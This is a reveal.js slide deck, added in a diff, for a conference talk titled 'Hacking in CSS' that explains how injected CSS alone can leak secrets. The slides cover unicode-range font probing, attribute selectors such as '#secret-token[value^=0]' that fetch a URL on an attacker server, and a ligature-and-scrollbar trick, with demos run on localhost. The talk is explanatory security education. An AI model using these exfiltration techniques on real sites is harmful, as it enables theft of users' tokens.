@@ -1,0 +1,464 @@
+<!doctype html>
+<html>
+
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+
+	<title>reveal.js</title>
+
+	<link rel="stylesheet" href="css/reveal.css">
+	<link rel="stylesheet" href="css/theme/black.css" id="theme">
+
+	<!-- Theme used for syntax highlighting of code -->
+	<link rel="stylesheet" href="lib/css/zenburn.css">
+	<style>
+		img.seamless.seamless {
+			border: none;
+			background: transparent;
+			box-shadow: none;
+		}
+
+		input {
+			font-size: 100%;
+			border: 2px solid black;
+		}
+	</style>
+
+	<!-- Printing and PDF exports -->
+	<script>
+		var link = document.createElement('link');
+		link.rel = 'stylesheet';
+		link.type = 'text/css';
+		link.href = window.location.search.match(/print-pdf/gi) ? 'css/print/pdf.css' : 'css/print/paper.css';
+		document.getElementsByTagName('head')[0].appendChild(link);
+	</script>
+</head>
+
+<body>
+	<div class="reveal">
+		<div class="slides">
+			<section>
+				<h2>zażółć gęślą jaźń</h2>
+				<h3>testy</h3>
+				<p>– Oh my God. I didn't even know Smarties made a cereal.</p>
+				<p>– They don't. It's just Smarties in a bowl with milk.</p>
+				<ul>
+					<li>podpunkt</li>
+					<li>więcej informacji</li>
+				</ul>
+				<p>
+					<a href="#" onclick="document.getElementById('theme').setAttribute('href','css/theme/black.css'); return false;">Black</a> -
+					<a href="#" onclick="document.getElementById('theme').setAttribute('href','css/theme/white.css'); return false;">White</a> -
+					<a href="#" onclick="document.getElementById('theme').setAttribute('href','css/theme/league.css'); return false;">League</a> -
+					<a href="#" onclick="document.getElementById('theme').setAttribute('href','css/theme/sky.css'); return false;">Sky</a> -
+					<a href="#" onclick="document.getElementById('theme').setAttribute('href','css/theme/beige.css'); return false;">Beige</a> -
+					<a href="#" onclick="document.getElementById('theme').setAttribute('href','css/theme/simple.css'); return false;">Simple</a>
+					<br>
+					<a href="#" onclick="document.getElementById('theme').setAttribute('href','css/theme/serif.css'); return false;">Serif</a> -
+					<a href="#" onclick="document.getElementById('theme').setAttribute('href','css/theme/blood.css'); return false;">Blood</a> -
+					<a href="#" onclick="document.getElementById('theme').setAttribute('href','css/theme/night.css'); return false;">Night</a> -
+					<a href="#" onclick="document.getElementById('theme').setAttribute('href','css/theme/moon.css'); return false;">Moon</a> -
+					<a href="#" onclick="document.getElementById('theme').setAttribute('href','css/theme/solarized.css'); return false;">Solarized</a>
+				</p>
+				<aside class="notes">
+					These are my super secret notes.
+					<br> Q: Can a kangaroo jump higher than a house?
+					<br> A: Of course, a house doesn’t jump at all.
+				</aside>
+			</section>
+
+			<section>
+				<h1>Hacking in CSS</h1>
+				<p>
+					<small>by
+						<a href="https://typeofweb.com" target="_blank">Michał Miszczyszyn</a> /
+						<a href="https://typeofweb.com" target="_blank">Type of Web</a>
+					</small>
+				</p>
+			</section>
+
+			<section>
+				<h2>Michał Miszczyszyn</h2>
+				<img src="img/10308105_4261629354442_4246729927061964868_n kwadrat.jpg" alt="" style="float: right; width: 33%;">
+				<div style="float: left; width: 66%; text-align: left;">
+					<p>
+						Full-Stack JS Developer @
+						<a href="https://x-team.com" target="_blank">X-Team</a>
+					</p>
+					<p>
+						<a href="https://twitter.com/mmiszy" target="_blank">@mmiszy</a>
+					</p>
+					<p>
+						<a href="mailto:michal@miszczyszyn.com" target="_blank">michal@miszczyszyn.com</a>
+					</p>
+					<p>
+						<a href="https://typeofweb.com/" target="_blank">typeofweb.com</a>
+					</p>
+				</div>
+			</section>
+
+			<section>
+				<h2>Question</h2>
+				<p class="fragment">Who knows CSS?</p>
+				<p class="fragment">Who works on backend?</p>
+				<p class="fragment">Who does both very well?</p>
+				<img src="img/css3.png" style="max-width: 200px;" class="seamless" alt="">
+				<aside class="notes">
+					Let's start with a simple question first.
+					<br>Who of you knows CSS very well? Hands up!
+					<br>Who of you works on the backend?
+					<br>Who does both very well?
+				</aside>
+			</section>
+
+			<section>
+				<h2>This presentation:</h2>
+				<ul>
+					<li class="fragment">is about hacking</li>
+					<li class="fragment">we're about to exploit some CSS</li>
+				</ul>
+			</section>
+
+			<section>
+				<h2>This presentation:</h2>
+				<ul>
+					<li class="fragment">won't be very useful</li>
+					<li class="fragment">works on rare occasions</li>
+					<li class="fragment">is just a PoC</li>
+					<li class="fragment">but I found it very interesting</li>
+				</ul>
+				<h3 class="fragment">And here we are.</h3>
+
+				<aside class="notes">
+					What I'm about to show you won't be very useful
+					<br> Works only on rare occasions
+					<br> Is just a PoC
+					<br> But I found it interesting
+					<br> So here we are stuck together in this room for the next 15 minutes.
+				</aside>
+			</section>
+
+			<section>
+				<h2>Assumption: You can inject external CSS code to the website</h2>
+				<p class="fragment">How?</p>
+				<p>
+					<span class=fragment>CSS Injection,</span>
+					<span class=fragment>Path Traversal,</span>
+					<span class=fragment>MitM,</span>
+					<span class=fragment>ARP spoofing,</span>
+					<span class=fragment>…</span>
+				</p>
+
+				<aside class="notes">
+					There are plenty of ways to inject CSS. You could exploit Path Traversal, Man in the Middle, ARP spoofing and so on
+				</aside>
+			</section>
+
+			<section>
+				<h1>Part 1</h1>
+			</section>
+
+			<section>
+				<h1>Introduction</h1>
+			</section>
+
+			<section>
+				<h2>Moar questions</h2>
+				<p class="fragment">Who knows CSS
+					<code>font-face</code>?</p>
+				<p class="fragment">Who knows
+					<code>unicode-range</code> property?</p>
+				<aside class="notes">
+					More questions. Who knows CSS font-face property?
+					<br> And who knows about unicode-range
+				</aside>
+			</section>
+
+			<section>
+				<h2>Just latin characters:</h2>
+				<pre><code class="css" data-trim>
+/* latin */
+@font-face {
+  font-family: 'Roboto';
+  font-style: normal;
+  font-weight: 400;
+  src: url(https://fonts.gstatic.com/…/roboto.woff2) format('woff2');
+  unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2212, U+2215;
+}
+					</code></pre>
+				<aside class="notes">
+					This is how Google Fonts specify which font files should be used.
+					<br>In this case, that specific file includes latin characters
+				</aside>
+			</section>
+
+			<section>
+				<h2>Latin-extended characters:</h2>
+				<pre><code class="css" data-trim>
+/* latin-ext */
+@font-face {
+  font-family: 'Roboto';
+  font-style: normal;
+  font-weight: 400;
+  src: url(https://fonts.gstatic.com/…/roboto-ext.woff2) format('woff2');
+  unicode-range: U+0100-024F, U+1E00-1EFF, U+20A0-20AB, U+20AD-20CF, U+2C60-2C7F, U+A720-A7FF;
+}
+								</code></pre>
+				<aside class="notes">
+					Now let's imagine our website is in Polish.
+					<br> We need some latin-extended characters
+				</aside>
+			</section>
+
+			<section>
+				<h2>As a result</h2>
+				<p>
+					<code>roboto-ext.woff2</code> will be downloaded only if there are latin-extended characters on the webpage</strong>
+				</p>
+			</section>
+
+			<section>
+				<h2>Why?</h2>
+				<p>For performance.</p>
+				<p>Only download fonts (characters) you need.</p>
+				<p>i.e. subpages in English, Polish and Arabic</p>
+				<aside class="notes">
+					Why is this useful?
+					<br> It helps optimize pages and applications.
+					<br> If your website is in English, Polish and Arabic you only download certain characters on specific subpages
+				</aside>
+			</section>
+
+			<section>
+				<h1>Vulneralibility</h1>
+			</section>
+
+			<section>
+				<h2>The plan:</h2>
+				<ul>
+					<li class="fragment">Find CSS injection possibility</li>
+					<li class="fragment">Generate CSS stylesheet</li>
+					<li class="fragment">Have one font-face per each character</li>
+				</ul>
+			</section>
+
+			<section>
+				<h2>DEMO</h2>
+				<a target="_blank" href="http://localhost:8000/demo1/vulnerablesite.html">site</a>
+				<br>
+			</section>
+
+			<section>
+				<p>This way you narrowed down characters for bruteforcing the token</p>
+				<p>(or for another attack)</p>
+			</section>
+
+			<section>
+				<h2>It's not a bug, it's a feature!</h2>
+				<blockquote>„This does seem like an unfortunate side effect”</blockquote>
+				<a href="https://bugs.chromium.org/p/chromium/issues/detail?id=543078">@font-face unicode-range can be used as text reader</a>
+
+				<aside class="notes">
+					It's not a bug, it's officially a feature. Won't fix. More info on the linked webpage
+				</aside>
+			</section>
+
+			<section>
+				<h2>But wait, there's more!</h2>
+				<aside class="notes">
+					CSS has more features which can be used to attack your victims and still their data.
+				</aside>
+			</section>
+
+			<section>
+				<h1>Part 2</h1>
+			</section>
+
+			<section>
+				<h2>Selectors</h2>
+				<p class="fragment">Different scenario:</p>
+				<p class="fragment">You want to steal a token from input's attribute?</p>
+			</section>
+
+			<section>
+				<h2>SAY NO MORE</h2>
+			</section>
+
+			<section>
+				<p>There are several ways to do it.</p>
+				<p class="fragment">I'll show you the simplest one.</p>
+			</section>
+
+			<section>
+				<pre><code class="css" data-trim>
+#secret-token[value^=0] {
+	background-image: url(http://localhost:3000/token/0);
+}
+				</code></pre>
+
+				<p>that + iframe + some node.js + refresh a few times = PWND</p>
+
+				<aside class="notes">
+					This selector matches secret-token for which its value attribute starts with 0
+				</aside>
+			</section>
+
+			<section>
+				<h1>DEMO</h1>
+				<a target="_blank" href="http://localhost:8080/">Site</a>
+				<br>
+				<a target="_blank" href="http://localhost:3000/first-pass.css">CSS</a>
+				<br>
+				<a target="_blank" href="http://localhost:3000/iframe">attack</a>
+			</section>
+
+
+
+
+			<section>
+				<h1>Part 3</h1>
+			</section>
+
+			<section>
+				<h2>Ligatures</h2>
+				<p>What is a ligature?</p>
+			</section>
+
+			<section>
+				<img src="img/ligatures_1.png">
+				<p>It's meant to be more readable and beautiful :)</p>
+
+				<aside class="notes">
+					On the left: text without ligatures.
+					<br>On the right: with ligatures
+				</aside>
+			</section>
+
+			<section>
+				<h3>CSS fonts can define ligatures</h3>
+
+				<aside class="notes">So how can we use it for stealing someone's token?</aside>
+			</section>
+
+			<section>
+				<ul>
+					<li class="fragment">dynamically create a font</li>
+					<li class="fragment">define all characters 0px wide</li>
+					<li class="fragment">define certain ligature to be 10000px wide</li>
+				</ul>
+			</section>
+
+			<section>
+				<ul>
+					<li class="fragment">load the page inside an iframe</li>
+					<li class="fragment">add the CSS</li>
+					<li class="fragment">scrollbar in iframe = match</li>
+				</ul>
+			</section>
+
+			<section>
+				<pre><code class="css" data-trim>
+body::-webkit-scrollbar:horizontal {
+    background: url(http://localhost:3000/match);
+}
+				</code></pre>
+
+				<aside class="notes">
+					When there's a match, scrollbar appears.
+					<br>When scrollbar appears, this CSS is in use.
+					<br>When this CSS is in use, the browser issues a request to our server.
+					<br>This way we know which ligature was a match and we can continue
+				</aside>
+			</section>
+
+			<section>
+				<ul>
+					<li>repeat!</li>
+				</ul>
+				<div class="fragment">
+					<video src="img/poc5.mp4" controls></video>
+					<p style="font-size: 50%;">source: sekurak.pl</p>
+				</div>
+			</section>
+
+
+			<section>
+				<h1>Summary</h1>
+			</section>
+
+			<section>
+				<ul>
+					<li class="fragment">In this presentation I only injected CSS (never JS)</li>
+					<li class="fragment">We rarely think about securing our CSS</li>
+					<li class="fragment">CSS alone can be used for stealing data</li>
+					<li class="fragment">I hope you had some fun!</li>
+				</ul>
+			</section>
+
+			<section>
+				<h1>BONUS</h1>
+			</section>
+
+			<section>
+				<h2>What if the token is inside a
+					<code>&lt;script></code> tag?</h2>
+			</section>
+
+			<section>
+				<h2>SAY NO MORE</h2>
+			</section>
+
+			<section>
+				<h2>DEMO</h2>
+				<a target="_blank" href="http://localhost:8000/demo3/index.html">Site</a>
+				<br>
+				<a target="_blank" href="http://localhost:8000/demo3/index2.html">Site hacked</a>
+			</section>
+
+			<section>
+				<h2>Thank you!</h2>
+				<img src="img/10308105_4261629354442_4246729927061964868_n kwadrat.jpg" alt="" style="float: right; width: 33%;">
+				<div style="float: left; width: 66%; text-align: left;">
+					<h3>Michał Miszczyszyn</h3>
+					<p>
+						<a href="https://twitter.com/mmiszy" target="_blank">@mmiszy</a>
+					</p>
+					<p>
+						<a href="mailto:michal@miszczyszyn.com" target="_blank">michal@miszczyszyn.com</a>
+					</p>
+					<p>
+						<a href="https://typeofweb.com/" target="_blank">typeofweb.com</a>
+					</p>
+				</div>
+			</section>
+		</div>
+	</div>
+
+	<script src="lib/js/head.min.js"></script>
+	<script src="js/reveal.js"></script>
+
+	<script>
+		// More info about config & dependencies:
+		// - https://github.com/hakimel/reveal.js#configuration
+		// - https://github.com/hakimel/reveal.js#dependencies
+		Reveal.initialize({
+			controls: true,
+			progress: true,
+			history: true,
+			center: true,
+			slideNumber: "c/t",
+
+			transition: 'fade', // none/fade/slide/convex/concave/zoom
+
+			dependencies: [
+				{ src: 'plugin/markdown/marked.js' },
+				{ src: 'plugin/markdown/markdown.js' },
+				{ src: 'plugin/notes/notes.js', async: true },
+				{ src: 'plugin/highlight/highlight.js', async: true, callback: function () { hljs.initHighlightingOnLoad(); } }
+			]
+		});
+	</script>
+</body>
+
+</html>
